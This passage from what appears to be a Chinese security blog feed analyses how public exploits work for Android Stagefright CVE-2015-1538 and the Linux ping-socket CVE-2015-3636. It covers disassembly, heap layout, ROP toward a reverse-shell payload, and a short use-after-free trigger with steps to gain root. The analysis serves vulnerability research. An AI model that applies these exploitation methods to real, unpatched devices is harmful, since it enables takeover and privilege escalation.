<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0007</span>DD2C loc_7DD2C                               ; CODE XREF: android::SampleTable::setSampleToChunkParams(<span class="keyword">long</span> <span class="keyword">long</span>,uint)+BCj</span><br><span class="line">.text:<span class="number">0007</span>DD2C                 LDR             R0, [R6,<span class="preprocessor">#<span class="number">8</span>]</span></span><br><span class="line">.text:<span class="number">0007</span>DD2E                 MOV.W           R10, <span class="preprocessor">#<span class="number">8</span></span></span><br><span class="line">.text:<span class="number">0007</span>DD32                 MUL.W           R7, R8, R5</span><br><span class="line">.text:<span class="number">0007</span>DD36                 LDRD.W          R2, R3, [R6,<span class="preprocessor">#<span class="number">0x20</span>]</span></span><br><span class="line">.text:<span class="number">0007</span>DD3A                 LDR             R1, [R0]     <span class="comment">// crash!!!</span></span><br><span class="line">.text:<span class="number">0007</span>DD3C                 MOV.W           R11, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line">.text:<span class="number">0007</span>DD40                 ADDS.W          R10, R10, R2</span><br><span class="line">.text:<span class="number">0007</span>DD44                 STMEA.W         SP, &#123;R4,R8&#125;</span><br><span class="line">.text:<span class="number">0007</span>DD48                 ADC.W           R11, R11, R3</span><br><span class="line">.text:<span class="number">0007</span>DD4C                 ADDS.W          R2, R10, R7</span><br><span class="line">.text:<span class="number">0007</span>DD50                 ADC.W           R3, R11, <span class="preprocessor">#<span class="number">0</span></span></span><br><span class="line">.text:<span class="number">0007</span>DD54                 LDR             R1, [R1,<span class="preprocessor">#<span class="number">0x1C</span>]</span></span><br><span class="line">.text:<span class="number">0007</span>DD56                 BLX             R1    <span class="comment">// 跳转可控!!!</span></span><br><span class="line">.text:<span class="number">0007</span>DD58                 CMP             R0, <span class="preprocessor">#<span class="number">0xC</span></span></span><br><span class="line">.text:<span class="number">0007</span>DD5A                 BEQ             loc_7DD5E</span><br><span class="line">.text:<span class="number">0007</span>DD5C                 B               loc_7DD72</span><br></pre></td></tr></table></figure>
<p>0007DD3A处执行了LDR R1, [R0]，获取R0寄存器的值，验证了该想法。注意下边BLX R1将跳转到R1执行代码，R1 ＝ [[R0]+0x1C],所以如果R0可控，则可控制代码执行流程。<br>R0＝41d00010，刚好是EXP中对喷的值sp_addr，所以构造好数据即可执行到shellcode中。</p>
<p>对照源码(附带注释)：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">status_t</span> SampleTable::setSampleToChunkParams(</span><br><span class="line">        <span class="keyword">off_t</span> data_offset, <span class="keyword">size_t</span> data_size) &#123;</span><br><span class="line">    <span class="keyword">if</span> (mSampleToChunkOffset &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 数据块偏移 </span></span><br><span class="line">    mSampleToChunkOffset = data_offset;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 小于8说明无数据（头部）</span></span><br><span class="line">    <span class="keyword">if</span> (data_size &lt; <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 获取size大小，前8个字节</span></span><br><span class="line">    <span class="keyword">uint8_t</span> header[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">                data_offset, header, <span class="keyword">sizeof</span>(header)) &lt; (<span class="keyword">ssize_t</span>)<span class="keyword">sizeof</span>(header)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">    &#125;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 高4位是否为0（version，flags）</span></span><br><span class="line">    <span class="keyword">if</span> (U32_AT(header) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Expected version = 0, flags = 0.</span></span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 获取低4位（Number Of Entries）</span></span><br><span class="line">    mNumSampleToChunkOffsets = U32_AT(&amp;header[<span class="number">4</span>]);</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 检测数据大小是否合法</span></span><br><span class="line">    <span class="keyword">if</span> (data_size &lt; <span class="number">8</span> + mNumSampleToChunkOffsets * <span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ERROR_MALFORMED;</span><br><span class="line">    &#125;</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 创建SampleToChunkEntry对象 size＝12</span></span><br><span class="line">    mSampleToChunkEntries =</span><br><span class="line">        <span class="keyword">new</span> SampleToChunkEntry[mNumSampleToChunkOffsets];</span><br><span class="line"> 	</span><br><span class="line"> 	<span class="comment">// 循环解析出每个SampleToChunkEntry数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; mNumSampleToChunkOffsets; ++i) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> buffer[<span class="number">12</span>];</span><br><span class="line">        <span class="keyword">if</span> (mDataSource-&gt;readAt(</span><br><span class="line">                    mSampleToChunkOffset + <span class="number">8</span> + i * <span class="number">12</span>, buffer, <span class="keyword">sizeof</span>(buffer))</span><br><span class="line">                != (<span class="keyword">ssize_t</span>)<span class="keyword">sizeof</span>(buffer)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ERROR_IO;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        CHECK(U32_AT(buffer) &gt;= <span class="number">1</span>);  <span class="comment">// chunk index is 1 based in the spec.</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// We want the chunk index to be 0-based.</span></span><br><span class="line">        mSampleToChunkEntries[i].startChunk = U32_AT(buffer) - <span class="number">1</span>;</span><br><span class="line">        mSampleToChunkEntries[i].samplesPerChunk = U32_AT(&amp;buffer[<span class="number">4</span>]);</span><br><span class="line">        mSampleToChunkEntries[i].chunkDesc = U32_AT(&amp;buffer[<span class="number">8</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后blx r1对应的代码为mDataSource-&gt;readAt()，mDataSource类型为<code>sp&lt;DataSource&gt;</code>，readAt函数在MPEG4DataSource中实现，位于虚表指针0x1C处，如下所示：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-1538-readAt.png" alt=""></p>
<p>所以可以得出崩溃时R0为mDataSource指针，即堆喷时覆盖了mDataSource指针。</p>
<p>再看setSampleToChunkParams函数调用来源：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">status_t MPEG4Extractor::parseChunk(off64_t *offset, int depth) &#123;</span><br><span class="line">	...</span><br><span class="line">	case FOURCC('s', 't', 's', 'c'):</span><br><span class="line">        &#123;</span><br><span class="line">            status_t err =</span><br><span class="line">                mLastTrack-&gt;sampleTable-&gt;setSampleToChunkParams(</span><br><span class="line">                        data_offset, chunk_data_size);</span><br><span class="line"></span><br><span class="line">            if (err != OK) &#123;</span><br><span class="line">                return err;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            *offset += chunk_size;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在解析stsc类型的数据中调用了该函数，查看sampleTable类，在其＋8处刚好为setSampleToChunkParams函数，对照汇编最开始的LDR R0, [R6,#8]，可知此时R6为sampleTable指针。</p>
<p>查看exp中stsc数据块内容<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-1538-1.png" alt=""></p>
<p>再结合前边源码setSampleToChunkParams解析过程：</p>
<p>1.检查数据块大小是否合法，即大于头部8个字节。</p>
<p>2.读取的mNumSampleToChunkOffsets为0xc0000003，经过mul计算后0xc0000003＊0c＝0x900000024，由于32位乘法指令导致上溢位0x24。<br>data_size为数据类型stsc前四个字节再减去8个字节的头部，即为0x34-0x8＝0x2c，即通过了<code>data_size &lt; 8 + mNumSampleToChunkOffsets * 12</code>的判断。</p>
<p>3.创建0xc0000003个SampleToChunkEntry对象，每个大小为12字节。</p>
<p>4.循环解析每个SampleToChunkEntry数据，由于EXP中stsc数据大小为0x1200字节，去掉前8个字节，则实际循环次数为(0x1200 / 0xc) - 1 = 0x17F次，如果在循环期间能够覆盖sampleTable或者mDataSource则必然崩溃。溢出的数据会不断填充高地址，所以要保证new出来的SampleToChunkEntry地址比他们低。</p>
<p>ida挂载调试，直接下断到<br>mSampleToChunkEntries = new SampleToChunkEntry[mNumSampleToChunkOffsets].<br>最后可以看到三个地址如下：<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-1538-2.png" alt=""><br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-1538-3.png" alt=""></p>
<p>加上在上级调用看到的mLastTrack地址，四个地址如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mSampleToChunkEntries       ＝ <span class="number">0xb7fb5358</span></span><br><span class="line">mLastTrack                  = <span class="number">0xb7fb59d0</span></span><br><span class="line">sampleTable                 = <span class="number">0xb7fb5a98</span></span><br><span class="line">mDataSource                 = <span class="number">0xb7fb50a8</span></span><br></pre></td></tr></table></figure>
<p>0xb7fb5a98 - 0xb7fb5358 = 0x740，所以只要溢出超过0x740字节就必定能够覆盖sampleTable地址上的内容，因此LDR R0, [R6,#8]后R0获取的并不是mDataSource而是stsc中的数据。</p>
<p>但是如果只是覆盖了sampleTable地址，执行不到下边的blx r1就会发生崩溃，所以这种情况并不能控制代码执行流程。<br>在EXP中，通过覆盖Track对象的sampleTable指针，然后程序执行到Track对象的析构函数来控制流程。</p>
<p>在调试中可以知道几个重要结构的地址分布：mSampleToChunkEntries &lt; Track &lt; sampleTable，看下Track结构：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> Track &#123;</span><br><span class="line">     Track *next;</span><br><span class="line">     sp&lt;MetaData&gt; meta;</span><br><span class="line">     <span class="keyword">uint32_t</span> timescale;</span><br><span class="line">     sp&lt;SampleTable&gt; sampleTable;</span><br><span class="line">     <span class="keyword">bool</span> includes_expensive_metadata;</span><br><span class="line">     <span class="keyword">bool</span> skipTrack;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>
<p>其中sampleTable指针位于Track＋0xC处，假如溢出覆盖到的地址为fake_addr,如果Track＋0xC &lt; fake_addr &lt; sampleTable，那么就能覆盖掉Track对象的sampleTable指针并不引起崩溃。<br>当所有数据块数据解析完后，会调用MPEG4Extractor中的析构函数，遍历track链表执行delete操作。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-1538-4.jpg" alt=""></p>
<p>delete函数会调用android::RefBase::decStrong<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-1538-5.png" alt=""></p>
<p>此时r0为sampleTable指针，利用方式和<a href="http://blog.idhyt.com/2015/08/01/exploit-cve-2014-7911-exp/">cve-2014-7911</a>相同。</p>
<h2 id="可利用条件">可利用条件</h2><p>利用条件需要多次调试来确定，调试过程几个重要的地方：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sony xperia S android 4.04</span></span><br><span class="line"><span class="comment">// 关闭aslr</span></span><br><span class="line">echo <span class="number">0</span> &gt; proc/sys/kernel/randomize_va_space </span><br><span class="line"></span><br><span class="line"><span class="comment">// 断点</span></span><br><span class="line">trak：</span><br><span class="line">    /systembbstagefright.so+<span class="number">0x6CB68</span> ｜ _ZN7android14MPEG4Extractor10parseChunkEPxi+<span class="number">0x208</span></span><br><span class="line"></span><br><span class="line">stsc:</span><br><span class="line">    _ZN7android11SampleTable22setSampleToChunkParamsExj</span><br><span class="line">    <span class="comment">// (mSampleToChunkEntries = new SampleToChunkEntry[mNumSampleToChunkOffsets];)</span></span><br><span class="line">    _ZN7android11SampleTable22setSampleToChunkParamsExj+<span class="number">0x66</span> </span><br><span class="line"></span><br><span class="line">MPEG4Extractor::~MPEG4Extractor</span><br><span class="line">    _ZN7android14MPEG4ExtractorD1Ev</span><br><span class="line"></span><br><span class="line">decStrong:</span><br><span class="line">    _ZNK7android7RefBase9decStrongEPKv</span><br></pre></td></tr></table></figure>
<p>漏洞利用条件限制要几个重要地址：<br><code>track1</code>，<code>track2</code>，<code>sampleTable2</code>，<code>SampleToChunkEntry2</code>。<br>MPEG4Extractor在析构是通过track链表遍历逐个删除，那么覆盖掉track1或者track2的sampleTable指针都可以控制程序流程。<br>为保证程序不崩，溢出的地址必须位于track2和sampleTable2中间，所以可利用条件为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SampleToChunkEntry2 + overflowSize &#60; (track1 | track2) + 0xC &#60; sampleTable2</span><br></pre></td></tr></table></figure></p>
<p>上边条件需要多次调试来调整overflowSize大小。</p>
<p>比如某次调试中发现：<br>track1 ＝ 0x2D3D8<br>track2 = 0x2E458<br>SampleToChunkEntry2 = 0x2DB00<br>sampleTable2 = 0x2F010<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-1538-sampleTable2.png" alt=""></p>
<p>sampleTable2 - SampleToChunkEntry2 = 0x1510<br>track2 - SampleToChunkEntry2 = 0x958</p>
<p>满足利用条件，即SampleToChunkEntry2溢出以后能够成功覆盖track2并且程序不崩溃。<br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-1538-sampleToChunkEntry2.png" alt=""><br><img src="http://o9xrwsn0z.bkt.clouddn.com/exploit-cve-2015-1538-trak2.png" alt=""></p>
<p>另外exp中的堆喷地址sp_addr需要调试去确定一个概率比较高的地址，libc.so:restore_core_regs地址也需要修改。</p>
<p>exp在实际测试中成功率很低，原因都是由于溢出数据覆盖掉了sampleTable地址的数据，导致调用mDataSorce时崩溃，或者覆盖的地址高于track和sampleTable几个对象以外的其他数据，导致应用解析失败或者crash。</p>
<p>另一篇分析文章<a href="http://huntcve.github.io/2015/12/16/debug-stagefright-exploit/" target="_blank" rel="external">一步一步调通stagefright exploit</a>说明的tx3g位置问题我在调试时也验证了，SampleToChunkEntry2地址位于track1和track2之间的几率相对来说比较大，但是还是有几率落在track1之前，溢出大小我的机器上调试过程中，在能成功率用的内存布局情况下，track2和SampleToChunkEntry2的距离基本是在0x900～0x1200之间，所以原作者的溢出值并没有问题，需要针对不同机器调试确认，下边是我实际调试中选取的10组数据。</p>
<table>
<thead>
<tr>
<th style="text-align:center">index</th>
<th style="text-align:center">track1</th>
<th style="text-align:center">track2</th>
<th style="text-align:center">SampleToChunkEntry2</th>
<th style="text-align:center">sampleTable2</th>
<th style="text-align:center">overflow_size</th>
<th style="text-align:center">is_exploit</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0</td>
<td style="text-align:center">0x2d2d8</td>
<td style="text-align:center">0x2d298</td>
<td style="text-align:center">0x2e100</td>
<td style="text-align:center">0x2e9f0</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">0x2d698</td>
<td style="text-align:center">0x15e00</td>
<td style="text-align:center">0x2db70</td>
<td style="text-align:center">0x2ede0</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">0x40cb0</td>
<td style="text-align:center">0x407f0</td>
<td style="text-align:center">0x3ef98</td>
<td style="text-align:center">0x44528</td>
<td style="text-align:center">0x1858</td>
<td style="text-align:center">yes</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">0x2d288</td>
<td style="text-align:center">0x2d360</td>
<td style="text-align:center">0x2d760</td>
<td style="text-align:center">0x2ec70</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">0x3d500</td>
<td style="text-align:center">0x400a0</td>
<td style="text-align:center">0x42e48</td>
<td style="text-align:center">0x3fa00</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">5</td>
<td style="text-align:center">0x40a38</td>
<td style="text-align:center">0x3ccf0</td>
<td style="text-align:center">0x428a8</td>
<td style="text-align:center">0x3e530</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">6</td>
<td style="text-align:center">0x2d3d8</td>
<td style="text-align:center">0x2e458</td>
<td style="text-align:center">0x2db00</td>
<td style="text-align:center">0x2f010</td>
<td style="text-align:center">0x958</td>
<td style="text-align:center">yes</td>
</tr>
<tr>
<td style="text-align:center">7</td>
<td style="text-align:center">0x418e0</td>
<td style="text-align:center">0x3feb8</td>
<td style="text-align:center">0x43f38</td>
<td style="text-align:center">0x3fb90</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">8</td>
<td style="text-align:center">0x3d548</td>
<td style="text-align:center">0x410f0</td>
<td style="text-align:center">0x3f890</td>
<td style="text-align:center">0x3fa88</td>
<td style="text-align:center">x</td>
<td style="text-align:center">no</td>
</tr>
<tr>
<td style="text-align:center">9</td>
<td style="text-align:center">0x3cf78</td>
<td style="text-align:center">0x3f690</td>
<td style="text-align:center">0x3e5e0</td>
<td style="text-align:center">0x42a40</td>
<td style="text-align:center">0x10b0</td>
<td style="text-align:center">yes</td>
</tr>
</tbody>
</table>
<h2 id="漏洞利用">漏洞利用</h2><p>析构函数执行过后会跳到ROP中，rop布局好数据后先是调用mprotect函数将sp_addr地址长度为0x1000改为可执行权限，然后跳入shell_reverse_tcp代码中执行，参考<a href="http://drops.wooyun.org/papers/10896" target="_blank" rel="external">CVE-2015-1538漏洞利用中的Shellcode分析</a>。</p>
<p>这个过程中所有函数的调用通过SVC指令完成，类似于Intel CPU中的int 0x80中断，SVC指令会根据相应的调用号去执行相应的函数，这些编号定义在<code>include\arm\unistd.h</code>中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_restart_syscall (__NR_SYSCALL_BASE+ <span class="number">0</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_exit (__NR_SYSCALL_BASE+ <span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_fork (__NR_SYSCALL_BASE+ <span class="number">2</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_read (__NR_SYSCALL_BASE+ <span class="number">3</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_write (__NR_SYSCALL_BASE+ <span class="number">4</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_open (__NR_SYSCALL_BASE+ <span class="number">5</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_close (__NR_SYSCALL_BASE+ <span class="number">6</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_creat (__NR_SYSCALL_BASE+ <span class="number">8</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_link (__NR_SYSCALL_BASE+ <span class="number">9</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_unlink (__NR_SYSCALL_BASE+ <span class="number">10</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_execve (__NR_SYSCALL_BASE+ <span class="number">11</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> __NR_chdir (__NR_SYSCALL_BASE+ <span class="number">12</span>)</span></span><br></pre></td></tr></table></figure>
<h2 id="影响">影响</h2><p>/system/core/rootdir/init.rc定义了mediaserver用户组权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">service media /system/bin/mediaserver <span class="number">511</span>    </span><br><span class="line"><span class="keyword">class</span> main    </span><br><span class="line">user media  </span><br><span class="line">group audio camera inet net_bt net_bt_admin net_bw_acct drmrpc mediadrm </span><br><span class="line">ioprio rt <span class="number">4</span></span><br></pre></td></tr></table></figure>
<p>system/core/include/private/android_filesystem_config.h<br>所以可以访问audio camera bluetooth。。。</p>
<h2 id="总结">总结</h2><ol>
<li>EXP利用MP4格式标准的其它Box申请了一些零碎的内存块创造内存间隙，在程序执行过程中这些零碎内存块很有可能被free，后面申请SampleToChunkEntry的内存就有可能出现在低地址，成功溢出到sampleTable指针并不造成崩溃。</li>
<li>Heap Spray，通过tx3g Box堆喷2M数据，使其某一page出现在预测地址上。</li>
<li>ROP和shell_reverse_tcp中的SVC调用，mprotect函数绕过dep保护。</li>
<li>mp4文件格式解析流程。</li>
<li>几个重要的内存地址的不确定性导致漏洞无法100%成功，并且rop中重要跳转指令直接硬编码，无法绕过aslr，但是溢出数据足够大能100％造成崩溃。</li>
<li>或者有其他细节我没理解到，又或者有更好的方法去布局内存分布，值得思考。</li>
</ol>
<h2 id="cve-2015-3864">cve-2015-3864</h2><p>cve-2015-3864是同系列中的另外一个漏洞，详见<a href="http://blog.idhyt.com/2016/03/15/exploit-cve-2015-3864/">cve-2015-3864</a>。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="漏洞分析">漏洞分析</h2><p>POC直接使用<a href="https://github.com/jduck/cve-2015-1538-1" target="_blank" rel="external">https://github.com/jduck/]]>
    </summary>
    
      <category term="cve" scheme="http://blog.idhyt.com/tags/cve/"/>
    
      <category term="libstagefright" scheme="http://blog.idhyt.com/tags/libstagefright/"/>
    
      <category term="exploit" scheme="http://blog.idhyt.com/categories/exploit/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2015-3636内核漏洞分析]]></title>
    <link href="http://blog.idhyt.com/2016/03/09/exploit-cve-2015-3636/"/>
    <id>http://blog.idhyt.com/2016/03/09/exploit-cve-2015-3636/</id>
    <published>2016-03-09T15:07:11.000Z</published>
    <updated>2016-07-07T13:46:41.000Z</updated>
    <content type="html"><![CDATA[<h2 id="漏洞简介">漏洞简介</h2><p>Linux kernel的ping套接字实现上存在释放后重利用漏洞，x86-64架构的本地用户利用此漏洞可造成系统崩溃，非x86-64架构的用户可提升其权限，pingpongroot就是利用该漏洞达到提权的效果，现在android-6.0以下的手机root工具靠的就是这个漏洞。</p>
<h2 id="漏洞分析">漏洞分析</h2><p>详细的分析参考KeenTeam这篇文章<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back-wp.pdf" target="_blank" rel="external">Own your Android! Yet Another Universal Root</a>。</p>
<p>漏洞POC很简单，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sockfd= socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);  <span class="comment">// refcount =1;       </span></span><br><span class="line">structsockaddr addr = &#123; .sa_family = AF_INET &#125;;</span><br><span class="line"><span class="keyword">int</span> ret =connect(sockfd, &amp;addr, <span class="keyword">sizeof</span>(addr));  <span class="comment">// refcount ++;  创建hash</span></span><br><span class="line">structsockaddr _addr = &#123; .sa_family = AF_UNSPEC &#125;;</span><br><span class="line">ret =connect(sockfd, &amp;_addr, <span class="keyword">sizeof</span>(_addr));  <span class="comment">//删除hash；refcount --;</span></span><br><span class="line">ret =connect(sockfd, &amp;_addr, <span class="keyword">sizeof</span>(_addr)); <span class="comment">// bug导致继续删除hash；refcount --; refcount</span></span><br></pre></td></tr></table></figure>
<p>简单的说就是当用户用ICMP socket和AF_UNSPEC为参数调用connect()时，系统会直接跳到disconnect(),删除当前sock对象的hash,并且让refcount递减一次，删除hash过程的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ping_unhash</span><span class="params">(<span class="keyword">struct</span> sock *sk)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> inet_sock *isk = inet_sk(sk);</span><br><span class="line">	pr_debug(<span class="string">"ping_unhash(isk=%p,isk-&gt;num=%u)\n"</span>, isk, isk-&gt;inet_num);</span><br><span class="line">	<span class="keyword">if</span> (sk_hashed(sk)) &#123;</span><br><span class="line">		write_lock_bh(&amp;ping_table.lock);</span><br><span class="line">		hlist_nulls_del(&amp;sk-&gt;sk_nulls_node);</span><br><span class="line">		sock_put(sk);</span><br><span class="line">		isk-&gt;inet_num = <span class="number">0</span>;</span><br><span class="line">		isk-&gt;inet_sport = <span class="number">0</span>;</span><br><span class="line">		sock_prot_inuse_add(sock_net(sk), sk-&gt;sk_prot, -<span class="number">1</span>);</span><br><span class="line">		write_unlock_bh(&amp;ping_table.lock);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一次调用hlist_nulls_del删除hash后会将hlist_node.pprv=0x200200，然后再用相同的参数再调用一次connect()，因为hash已经被删除了，此时if语句应该返回FALSE，但是由于hlist_node.pprv = 0x200200 != null导致sk_hashed(sk)返回TRUE，导致refcount被多减了一次。因此，攻击者只需要创建一个ICMP socket，连续调用3个connect()（第一个connect()用来生成hash）,就可以把refcount置为0，从而释放sock对象导致UAF。</p>
<h2 id="漏洞利用思路">漏洞利用思路</h2><ol>
<li>填充PING socket objects，覆盖close指针。</li>
<li>调用close(sockfd)获取控制权。</li>
<li>泄漏内核栈获取thread_info结构。</li>
<li>修改thread_info.addr_limit值为0xffffffff。</li>
<li>修改thread_info.task.cred提权。</li>
<li>由于0x200200地址并没有map，所以最开始要先在该地址map内存防止程序崩溃。</li>
</ol>
